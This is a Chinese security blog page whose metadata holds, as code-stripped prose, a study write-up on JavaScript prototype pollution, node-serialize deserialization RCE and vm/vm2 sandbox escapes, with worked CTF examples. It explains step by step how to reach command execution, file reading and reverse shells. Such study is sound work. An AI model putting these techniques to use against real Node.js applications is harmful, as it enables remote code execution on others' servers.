<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>JavaScript原型链污染学习 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="JavaScript原型链污染学习"><meta name="application-name" content="JavaScript原型链污染学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="JavaScript原型链污染学习"><meta property="og:url" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮ 0x02 危险函数所导致的命令执行 2.1 eval() eval() 函数可计算某个字符串，并执"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮ 0x02 危险函数所导致的命令执行 2.1 eval() eval() 函数可计算某个字符串，并执"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'JavaScript原型链污染学习',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 危险函数所导致的命令执行, 2.1 eval(), 2.2 类似命令, 0x03 JavaScript类, 3.1 类的声明, 3.2 new 做了什么, 3.3 构造器 constructor, 3.4 原型和继承, 3.5 原型对象 prototype 和 proto, 3.6 继承与原型链：new 到底做了什么, 3.7 原型链污染, 0x04 深入理解 JavaScript Prototype 污染攻击, 4.1 prototype和__proto__分别是什么, 4.2 JavaScript原型链继承, 4.3 原型链污染是什么, 4.4 哪些情况下原型链会被污染, 4.5 Code-Breaking 2018 Thejs 分析, 4.6 Tips, 0x05 进一步理解-简化版, 5.1 原型链污染原理, 5.2 Code-Breaking 2018 Thejs, 5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941), 0x06 vm沙箱逃逸, 6.1 沙箱逃逸初识, 6.2 Node将字符串执行为代码, 6.3 Nodejs作用域, 6.4 vm沙箱逃逸, 6.5 vm沙箱逃逸的一些其他情况, 6.6 vm2, 6.7 vm2中的沙箱绕过, CVE-2019-10761, CVE-2021-23449, 知识星球上的另外一个trick, 6.8 简单理解, 6.9 javascript大小写特性, 6.10 CTF题实例 - Hacktm中的一道Nodejs题, 0x07 Tips, 7.1 fs 文件系统, 7.2 全局变量展开, 7.3 child_process, 0x08 参考文章前言最近新生赛老是碰到原型链题目我纳闷儿呢这玩意儿也算新生难度了终究是我太菜了话不多说直接开卷以下几乎都是转载的参考文章请见谅危险函数所导致的命令执行函数可计算某个字符串并执行其中的的代码和中函数一样如果传递到函数中的参数可控并且没有经过严格的过滤时就会导致漏洞的出现简单例子应用实例访问地址为漏洞利用中的调用的是它是一个解释器可以执行系统命令在函数的参数中可以构造来进行调用弹计算器读取文件反弹是加密后的结果直接调用会报错注意加密后的字符中有一个号需要编码为一定情况下如果上下文中没有类似于则可以使用来执行命令一个命令执行的例子使用数组绕过过滤再调用执行命令类似命令间隔两秒执行函数两秒后执行函数处就类似于函数的参数输出类似于中的以上都可以导致命令执行类类的声明下面是一个基本的类的声明然后我们创建类的实例基于我们在其它编程语言的习惯上面的代码非常易于理解上述代码中称为类的属性称为类的方法称为类的静态方法在之前并没有提供语法类的功能是基于函数来实现的如下创建类创建实例现在我们注意下面几个细节用函数实现时的内容参数函数体与用类实现时的相同用函数实现时方法声明在层中用函数实现时静态方法直接声明在层中做了什么可以说的任何一个对象都是一个不论是等它们都具有一种结构注意中含有类此处的泛指一种数据结构与类无关我们称为对象为了与类创建的实例也称为对象作区分我们称类创建的实例为实例实例也是对象也就是说函数本身就具有一种结构它具有它的属性方法我们把注意力放在这一行上事实上这两种实现方法用语法和用函数实现的最终具有相同的结构其中基于函数的实现更接近的本真逻辑而更像是一种语法糖注意此处不要将两种实现方式的分别命名成和然后通过或者去比较它将永远返回因为两者的地址是不一样的正如和的返回值也是一样那么根据我们所注意到的几个细节我们猜测进行操作时创建了一个新的结构这个结构继承自的属性这一过程引入了方法随后以这个新创建的结构为传递参数并运行构造器中的内容这一过程引入了属性至于静态方法则很好理解我们调用静态方法写的是那么这些静态方法也自然引入于的结构本身之中实例创建后为了追溯这一过程新创建的实例的结构会带有属性指向创建它的构造器在此处为函数带有属性指向它的原型也就是它继承过来的地方在此处为接下来我们进行验证我们注意到基于函数实现的写法中的本身是一个函数事实上它就是函数本身创建实例不论是哪种类的实现方法即使用语法创建我们也能够看到方法位于的之中创建实例使用语法结合上面的结论显然下面表达式的运行结果也是接下来我们验证下面的它指向了它的原型创建实例不论是哪种类的实现方法我们看到的过程实际上就是根据类创建一个对象结构的过程它具有以下步骤为实例添加方法以类的作为原型复制出一个新的对象结构为实例添加属性进行初始化操作运行类的构造器为实例添加和属性分别指向创建它时的构造器和原型事实上上述的描述并不准确我们将在稍后予以纠正构造器刚才的操作完全可以写成这意味着创建一个类的含义就是创建了一个构造器函数创建一个实例的含义就是在继承的基础上运行了这个构造器函数为了确保继承过程顺利进行这个构造器函数必须含有以下特征包含属性而在中任意函数都默认具有属性因此任意函数都符合一个构造器的标准任意函数都是一个构造器可用于生成类实例以上代码并不会报错在中继承这个概念贯彻在许多操作中每一个新的结构的诞生都进行了类似的逻辑因此任何一个对象除了都具有属性包括构造器本身构造器本身是一个函数当我们循环访问时将得到预定义的构造器而的构造器仍然是它本身以上表达式将返回我们可以总结出如下现象构造器链的尽头是的构造器是本身下面这张图更加地趋近本质可以稍后再来体悟原型和继承当我们谈论的原型实际上是在谈论对象结构之间的特殊关系有继承就有原型有原型就有继承原型的定义大致可以描述为和是两个结构继承于具有的全部内容那么称就是的原型在中一个结构就可以称为是一个具体的对象甚至包括是一个特殊的对象它表示空如果把对象之间的继承关系画一个遗传系谱图那么就是这张图上最原始的祖先我们具有构造器函数它也是一个结构对象具有一个属性我们可以将这个属性理解为创建实例时的模板当创建实例时实例会继承这个模板的全部内容当我们单独说谁是原型时其实并没有意义的不是的原型而是所要创建的实例的原型事实上这里命名为英文译为原型造成了重大的歧义经常对初学者甚至从业多年的程序员造成巨大困扰为了方便表述避免歧义我们之后将把构造器的称为构造器的原型模板构造器创建出实例后含有一个属性这个属性即为的原型刚才我们也提到也是的原型所以它们两个是等价的下面的表达式将返回我们可以用一张图描述这种关系下图中的和在内存中具有完全相同的地址只是它们所隶属的结构不一样当访问下的如果自己没有则会从它的原型中去查找从而实现继承几乎所有中的对象都有原型在中可以访问任何对象的属性查看它的原型另一方面有原型就有继承有继承就有相应的构造器我们可以访问任何对象的属性查看它的构造器原型对象和首先我们需要分辨清楚和的区别以为例这个构造器函数的原型并不是而是的原型是等于每一个实例都由它所对应的构造器所创建因此每一个实例都具有和属性实例的的地址与实例的一致但值得注意的是当我们循环访问时最终将指向而当我们循环访问时最终将会给出相同的结果这是因为一个构造器的原型模板的构造器就是构造器本身以上表达式都将返回这种循环自引用的逻辑或许会有些难以理解和记忆但它这么设计是有它的意义所在的如果我们将的修改成其它的将会发生什么例如然后我们访问它将返回构造器让我们查看的结构注意这里的在内核的浏览器可能显示的是其实就是的原型亦即因此的属性并不是被添加上去的而是继承自的这是对先前做了什么的总结的第一个修正这也说明了为什么一个构造器的默认指向这个构造器本身与不同的是将直接指向当前的结构继承自哪里请重新声明以覆盖前面对的修改运行结果如下对于第一条运行结果是显然的对于第三条运行结果正如我们刚才所提到的的将指向从而形成一种循环自引用对于第二条运行结果我们观察的内容我们注意到就是它是一个结构这个结构的原型应当是一个预定义的构造器创建的至于为什么即的属性不默认指向以追求统一这或许就是先前提到的的内在逻辑为了继承方便的特性吧现在我们进行第二个对先前做了什么的总结的纠错我们检查这个对象结构本身的层级是否具有属性可见其实本身并不具有属性在中当我们访问一个对象的属性如果当前对象的结构中找不到属性会从它的原型中去寻找由于这个特性的存在如果它的原型也是一个结构中找不到会从它的原型的原型中去找直到原型为也没有找到则返回注意事实上原型这个概念指的是程序运行的内在逻辑而不是这些属性是不容外部修改的换句话说默认指向了原型的地址而并不是说改变则改变了原型这一点可以通过修改然后运行使得的值变为然后访问进行验证会发现它返回的结果是我们追溯它的原型第一行返回了即它的原型的结构本身也不具有属性第二行返回了我们再次打印的结果这个结果和一致我们可以从的结构中看到它含有一个属性但是它是一个访问属性将运行这个函数将这个函数的返回值作为属性的值所谓就是指一个属性的值与一个函数相绑定访问这个属性它的值会通过一个函数动态获取这个函数称为这个属性的函数相应的还有这一概念当通过赋值语句对这个属性进行赋值时实际上是以后面的值为函数的参数调用了它的函数对于这一它的逻辑在解释器的代码中得到定义而并不是语言本身能够定义的我们可以通过运行如下代码判断一个它是不是一个运行结果如下显然的值是通过动态获取的我们运行意思是以为这个的指针运行这个函数的结果和一样因此中的实际上是通过中层层向原型访问的机制寻找到的它最终通过原型链指向了中的这一带有的属性我们可以通过下面的代码将的修改为一个确定的不带有的值然后我们会发现众多对象的都变成了包括和为了探查继承的逻辑我们刷新一下网页或者重置一下环境重新创建对象和实例运行如下代码对的进行修改然后访问会发现它返回了由此我们对做了什么进行第二次修正实际上属性也不是被添加上去的而是继承自构造器的属性再一次刷新网页或者重置环境查看的值综合上述探索和测试我们得到如下结论一个构造器的的构造器指向这个构造器本身访问会通过原型链继承的结果的尽头是在默认情况下一个对象结构的原型可通过它的属性反映继承与原型链到底做了什么通过上面的探索我们可以给出做了什么的最终答案的过程实际上就是根据构造器的属性创建一个对象结构的过程它具有以下步骤创建一个空的结构以这个新的结构为运行类的构造器在程序内部将这个结构的原型指向构造器的返回这个新的结构实例的属性由函数对添加属性而直接添加于实例新的结构之下属性是这个实例独有的由相同构造器创建的其它实例具有它们独有的属性互不影响实例的方法继承自构造器的改变构造器中的的内容将影响到所有由这个构造器创建的实例当我们访问这个实例的属性时并没有在这个实例的结构中找到对应的属性转而向它的原型构造器的寻找并找到了属性然后返回它的值当我们访问这个实例的属性时并没有在这个实例的的结构中找到对应的属性转而向它的原型构造器的寻找在它的原型中也没有找到转而继续向它的原型的原型寻找并找到了属性并返回它的值由于它是一个所以以所访问的实例为返回了这个函数的返回值我们访问实例的和属性的过程反映了中的一个重要概念原型原型链污染原型链指的是由多个连在一起而形成的链式原型访问如在默认情况下一个对象结构的所指向的地址与对象原型的地址是一致的由的原型链查找建立起来的秩序使得构造器和实例处于一种稳定的关系之中虽然我们通过的方式改变一个对象的属性并不能改变这个对象的原型但是我们却能够通过访问到它的原型如果我们对它的原型进行一些修改就能达到改变程序逻辑的目的从而触发一些漏洞这种人为通过原型链修改原型的行为成为原型链污染是一种常见的攻击手段对于大多数非预定义的对象可以通过或者访问它的原型对它原型下的属性进行修改可以造成原型链污染总的来说代码基础有点差从之后看的就有点困难了因此我再结合神的看一遍吧深入理解污染攻击和分别是什么中我们如果要定义一个类需要以定义构造函数的方式来定义函数的内容就是类的构造函数而就是类的一个属性为了简化编写代码后增加了语法但其实只是一个语法糖一个类必然有一些方法类似属性我们也可以将方法定义在构造函数内部但这样写有一个问题就是每当我们新建一个对象时就会执行一次这个方法实际上是绑定在对象上的而不是绑定在类中我希望在创建类的时候只创建一次方法这时候就则需要使用原型了我们可以认为原型是类的一个属性而所有用类实例化的对象都将拥有这个属性中的所有内容包括变量和方法比如上图中的对象其天生就具有方法我们可以通过来访问类的原型但实例化出来的对象是不能通过访问原型的这时候就该登场了一个类实例化出来的对象可以通过属性来访问类的原型也就是说所以总结一下是一个类的属性所有类对象在实例化的时候将会拥有中的属性和方法一个对象的属性指向这个对象所在的类的属性原型链继承所有类对象在实例化的时候将会拥有中的属性和方法这个特性被用来实现中的继承机制比如类继承了类的属性最后输出的是总结一下对于对象在调用的时候实际上引擎会进行如下操作在对象中寻找如果找不到则在中寻找如果仍然找不到则继续在中寻找依次寻找直到找到结束比如的就是的这个查找的机制被运用在面向对象的继承中被称作继承链以上就是最基础的面向对象编程我们并不深入研究更细节的内容只要牢记以下几点即可每个构造函数都有一个原型对象对象的属性指向类的原型对象使用链实现继承机制原型链污染是什么第一章中说到指向的是类的那么如果我们修改了中的值是不是就可以修改类呢做个简单的实验是一个简单的对象此时为修改的原型即由于查找顺序的原因仍然是此时再用创建一个空的对象查看最后虽然是一个空对象但的结果居然是原因也显而易见因为前面我们修改了的原型而是一个类的实例所以实际上是修改了这个类给这个类增加了一个属性值为后来我们又用类创建了一个对象对象自然也有一个属性了那么在一个应用中如果攻击者控制并修改了一个对象的原型那么将可以影响所有和这个对象来自同一个类父祖类的对象这种攻击方式就是原型链污染哪些情况下原型链会被污染在实际应用中哪些情况下可能存在原型链能被攻击者修改的情况呢我们思考一下哪些情况下我们可以设置的值呢其实找到能够控制数组对象的键名的操作即可对象合并对象其实内核就是将待操作的对象到一个空对象中以对象为例我们想象一个简单的函数在合并的过程中存在赋值的操作那么这个如果是是不是就可以原型链污染呢我们用如下代码实验一下结果是合并虽然成功了但原型链没有被污染这是因为我们用创建的过程中已经代表的原型了此时遍历的所有键名你拿到的是并不是一个自然也不会修改的原型那么如何让被认为是一个键名呢我们将代码改成如下可见新建的对象也存在属性说明已经被污染这是因为解析的情况下会被认为是一个真正的键名而不代表原型所以在遍历的时候会存在这个键操作是最常见可能控制键名的操作也最能被原型链攻击很多常见的库都存在这个问题分析下面是神出的题目这里我也只是清楚了漏洞利用点至于暂时不理解我在中出了一道原型链污染的题目为了更加贴合真实环境我没有刻意加太多自己的代码后端主要代码如下完整代码可参考这里是为了弥补原生函数功能不足而提供的一个辅助功能集其中包含字符串数组对象等操作这个应用中使用了提供的两个工具一个简单的模板引擎函数或对象的合并其实整个应用逻辑很简单用户提交的信息用方法合并到里多次提交里最终保存你提交的所有信息而这里的操作实际上就存在原型链污染漏洞在污染原型链后我们相当于可以给对象插入任意属性这个插入的属性反应在最后的中我们看到的代码是一个对象取到了其属性这个属性原本是没有赋值的默认取空字符串但因为原型链污染我们可以给所有对象中都插入一个属性最后这个被拼接进的第二个参数中造成任意代码执行漏洞我将带有的以的形式发送给后端因为框架支持根据来解析请求这里给我们注入原型提供了很大方便可见我们代码执行成功返回了命令的结果文章内关于原型和原型链的知识写的非常详细就不再总结整个过程了以下为几个比较重要的点在每一个实例对象都有一个属性属性可以向对象添加属性和方法例子在每一个实例对象都有一个属性这个实例属性指向对象的原型对象即原型可以通过以下方式访问得到某一实例对象的原型对象不同对象所生成的原型链如下部分对象直接继承了原型链数组都继承于原型链函数都继承于原型链进一步理解简化版原型链污染原理对于语句如果可以控制的值将设置为我们就可以给对象的原型设置一个属性值为这样所有继承对象原型的实例对象在本身不拥有属性的情况下都会拥有属性且值为来看一个简单的例子最终会输出两个为什么在没有设置属性的情况下也会输出呢就是因为在第二条语句中我们对的原型对象设置了一个属性而和一样都是继承了在获取时由于本身不存在属性就会往父类中去寻找这就造成了一个原型链污染所以原型链污染简单来说就是如果能够控制并修改一个对象的原型就可以影响到所有和这个对象同一个原型的对象这回再跟着先知社区的佬过一遍题目源码下载直接可以把需要的模块下载下来定义获取数据并合并再将赋值给问题出在了函数这里这个函数存在原型链污染漏洞但是光存在漏洞还不行我们得寻找到可以利用的点因为通过漏洞可以控制某一种实例对象原型的属性所以我们需要去寻找一个可以被利用的属性页面最终会通过进行渲染跟踪到中如图可以看到是一个对象是通过下面的语句赋值的默认没有属性所以默认也是为空如果我们能够给的原型对象加一个属性那么我们就可以控制的值继续往下面看最后传递到了函数的第二个参数当中通过构造就可以执行任意代码了最终可以构造一个简单的作为传递给主页面的的数据调用计算器这里直接用会报错神给了一个更好的下面跟着佬过一遍漏洞有时间下去复现反序列化漏洞漏洞出现在模块版本当中使用安装模块了解什么是立即调用函数表达式是一个在定义时就会立即执行的函数一般写成下面的形式或者漏洞点漏洞代码位于中其中的关键就是这一行语句可以看到传递给的参数是用括号包裹的所以如果构造一个函数在反序列化时就会被当中立即调用执行来看如何构造构造序列化生成的生成的为因为需要在反序列化时让其立即调用我们构造的函数所以我们需要在生成的序列化语句的函数后面再添加一个结果如下这里不能直接在对象内定义表达式不然会序列化失败传递给注意转义单引号执行命令成功结果如图沙箱逃逸沙箱逃逸初识说到沙箱逃逸我们先来明确一些基本的概念和之间有什么区别用在浏览器前端后来将中的引擎单独拿出来为单独开发了一个运行环境因此也可以作为一门后端语言写在后端服务端的就叫做什么是沙箱当我们运行一些可能会产生危害的程序我们不能直接在主机的真实环境上进行测试所以可以通过单独开辟一个运行代码的环境它与主机相互隔离但使用主机的硬件资源我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响而不会影响到主机上的功能沙箱的工作机制主要是依靠重定向将恶意代码的执行目标重定向到沙箱内部沙箱和虚拟机和容器之间的区别和使用的都是虚拟化技术但二者间使用的目的不一样沙箱用来隔离有害程序而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能属于的一种通过创造一个有边界的运行环境将程序放在里面使程序被边界困住从而使程序与程序程序与主机之间相互隔离开在实际防护时使用和嵌套的方式更多一点安全性也更高在中我们可以通过引入模块来创建一个沙箱但其实这个模块的隔离功能并不完善还有很多缺陷因此后续升级了也就是现在的沙箱引用了模块的功能并在其基础上做了一些优化将字符串执行为代码我们先来看两个在中将把字符串执行成代码的方式方法一首先我在目录下创建一个创建一个可以发现我们通过执行了一个字符串但是这种执行方式如果在当前作用域下已经有了同名的变量这个程序就会报错在中每一个模块都有自己独立的作用域所以用执行字符串代码很容易出现上面的这个问题我们再看另外一种方法方法二上面的方法因为模块间的作用域被限制了使用那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢的第一个参数是形参名称第二个参数是函数体我们都知道函数内和函数外是两个作用域不过当在函数中的作用域想要使用函数外的变量时要通过形参来传递当参数过多时这种方法就变的麻烦起来了从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个能够通过传一个字符串就能执行代码并且还与外部隔绝的作用域这也就是模块的作用作用域说到作用域我们就要说一下中的作用域是怎么分配的在中一般把作用域叫上下文在端浏览器发挥作用的一般是学过的师傅应该都知道我们打开浏览器的窗口是中最大的对象那么在服务端发挥作用的它的构造和不太一样我们在写一个项目时往往要在一个文件里其他的文件这些文件我们都给它们叫做包每一个包都有一个自己的上下文包之间的作用域是互相隔离不互通的也就是说就算我在中了那么我在中也无法直接调用中的变量和函数举个例子在同一级目录下有和两个文件运行发现报错值为那么我们想中引入并使用中的元素应该怎么办呢给我们提供了一个将文件中元素输出的接口把修改成下面这样我们再运行就可以拿到的值了我们用图来解释这两个包之间的关系就是这个时候就有人会问左上角的是什么这里就要说到中的全局对象了刚才我们提到在中是全局对象浏览器其他所有的属性都挂载在下那么在服务端的中和类似的全局对象叫做下其他的所有属性和包都挂载在这个对象下在下挂载了一些全局变量我们在访问这些全局变量时不需要用的方式来访问直接用就可以调用这个变量举个例子就是挂载在下的一个全局变量我们在用输出时并不需要写成其他常见全局变量还有一会逃逸要用到我们也可以手动声明一个全局变量但全局变量在每个包中都是共享的所以尽量不要声明全局变量不然容易导致变量污染用上面的代码举个例子输出可以发现我这次在中并没有使用将导入并且在输出时也没有用因为此时已经挂载在上了它的作用域已经不在中了我们输出一下对象可以看到确实挂载在了上沙箱逃逸我们在前面提到了作用域这个概念所以我们现在思考一下如果想要实现沙箱的隔离作用我们是不是可以创建一个新的作用域让代码在这个新的作用域里面去运行这样就和其他的作用域进行了隔离这也就是模块运行的原理先来了解几个常用的模块的在当前下创建一个作用域并将接收到的参数当作代码运行中可以访问到中的属性但无法访问其他包中的属性在使用前需要先创建一个沙箱对象再将沙箱对象传给该方法如果没有则会生成一个空的沙箱对象为这个沙箱对象在当前外再创建一个作用域此时这个沙箱对象就是这个作用域的全局对象沙箱内部无法访问中的属性参数为要执行的代码和创建完作用域的沙箱对象代码会在传入的沙箱对象的上下文中执行并且参数的值与沙箱内的参数值相同和的结合版传入要执行的代码和沙箱对象类类型的实例包含若干预编译的脚本这些脚本能够在特定的沙箱或者上下文中被运行创建一个新的对象只编译代码但不会执行它编译过的此后可以被多次执行值得注意的是是不绑定于任何全局对象的相反它仅仅绑定于每次执行它的对象要被解析的代码对象可以通过运行我们一般进行沙箱逃逸最后都是进行那么在里要进行就需要了在获取到对象后我们就可以用来导入再利用执行命令但挂载在上但是我们上面说了在后是不能访问到的所以我们最终的目标是通过各种办法将上的引入到沙箱中如果我们把代码改成这样参数最好用反引号包裹这样可以使更严格便于执行那么我们是怎么实现逃逸的呢首先这里面的指向的是当前传递给的对象这个对象是不属于沙箱环境的我们通过这个对象获取到它的构造器再获得一个构造器对象的构造器此时为的最后的是调用这个用的生成的函数最终返回了一个对象下面这行代码也可以达到相同的效果然后我们就可以通过返回的对象来了这里知识星球上提到了一个问题下面这段代码我们能不能把中的换成呢的意思是在沙箱内声明了一个对象也就是说这个对象是不能访问到下的如果我们将换成和也是访问不到的因为数字字符串布尔这些都是类型他们在传递的过程中是将值传递过去而不是引用类似于函数传递形参在沙盒内使用的已经不是原来的了所以无法利用我们将改成其他类型就可以利用了沙箱逃逸的一些其他情况知识星球里提到了这样的情况我们现在的为并且也没有其他可以引用的对象这时候想要逃逸我们要用到一个函数中的内置对象的属性它可以返回函数的调用者我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象并调用其中的方法这种情况下也是一样的我们只要在沙箱内定义一个函数然后在沙箱外调用这个函数那么这个函数的就会返回沙箱外的一个对象我们在沙箱内就可以进行逃逸了我们分析一下这段代码我们在沙箱内先创建了一个对象并且将这个对象的方法进行了重写通过获得到沙箱外的一个对象利用这个对象的构造函数的构造函数返回了再调用进行沙箱外在中通过字符串拼接的方式触发了这个重写后的函数如果沙箱外没有执行字符串的相关操作来触发这个并且也没有可以用来进行恶意重写的函数我们可以用来劫持属性和掘金触发利用链的逻辑就是我们在这个钩子里写了一个恶意函数当我们在沙箱外访问对象的任意属性不论是否存在这个钩子就会自动运行实现了如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢我们可以借助异常将沙箱内的对象抛出去然后在外部输出这里我们用捕获到了出的对象在时由于将字符串与对象拼接将报错信息和的回显一起带了出来通过上面几个例子可以看出来沙箱隔离功能较弱有很多逃逸的方法所以第三方包在的基础上做了一些优化我们看一下这些优化具体是怎么实现的安装包整个包下是这样的结构实现了可以在命令行中调用也就是下的封装了三个对象并且针对的类进行了代理是执行的入口导出了这两个沙箱环境还有一个实际上是封装了针对的一些函数和变量进行了拦截比如等相比做出很大的改进其中之一就是利用了新增的特性从而使用钩子拦截对和这些属性的访问先用演示一下是在的基础上封装的一个虚拟机我们只需要实例化后调用其中的方法就可以运行一段脚本那么在运行这两行代码时都做了什么事可以发现相比于的沙箱环境最重要的一步就是引入并针对做封装那么具体是怎么实现对的封装出现过多次逃逸的问题所以现有的代码被进行了大量修改为了方便分析需要使用较老版本的但上貌似将以前的版本全都删除了所以我这里也找不到对应的资源了代码分析也比较麻烦直接移步链接实现原理分析安全客安全资讯平台中的沙箱绕过该漏洞要求版本这个链子在牛的知识星球上有很抽象沙箱逃逸说到底就是要从沙箱外获取一个对象然后获得这个对象的属性这条链子获取沙箱外对象的方法是在沙箱内不断递归一个函数当递归次数超过当前环境的最大值时我们正好调用沙箱外的函数就会导致沙箱外的调用栈被爆掉我们在沙箱内这个异常对象就拿到了一个沙箱外的对象举个例子假设当前环境下最大递归值为我们通过程序控制递归次注意这里说的递归值不是一直调用同一个函数的最大值而是单次程序内调用函数次数的最大值也就是调用栈的最大值该函数递归次递归到第次时调用这个函数为就是下面图片的这个函数递归到次时为该函数是一个外部函数所以爆栈时捕捉的异常也是沙箱外从而返回了一个沙箱外的异常对象这个漏洞在解释是原型链污染导致的沙箱逃逸但牛在知识星球里发了其实是另外的原因在中是一个语法结构不是函数没法通过之前对这种函数处理相同的方法来处理它导致实际上我们调用的结果实际上是没有经过沙箱的是一个外部变量我们再获取这个变量的属性即可绕过沙箱对此的修复方法也很粗糙正则匹配并替换了关键字在编译失败的时候报错误知识星球上的另外一个在的原理中提到会为对象配置代理并初始化如果对象是以下类型就会函数这个函数中用到了全局对象我们可以通过劫持对象的并抛出异常再在沙箱内拿到这个异常对象就可以了简单理解是用来实现一个沙箱环境可以安全的执行不受信任的代码而不会影响到主程序但是可以通过构造语句来进行逃逸逃逸例子执行之后可以获取到主程序环境中的环境变量上面例子的代码等价于如下代码创建环境时首先要初始化一个对象这个对象就是中脚本执行时的全局环境脚本中全局指向的就是这个对象因为返回的是一个所以可以利用对象构造一个函数并执行此时对象的上下文环境是处于主程序中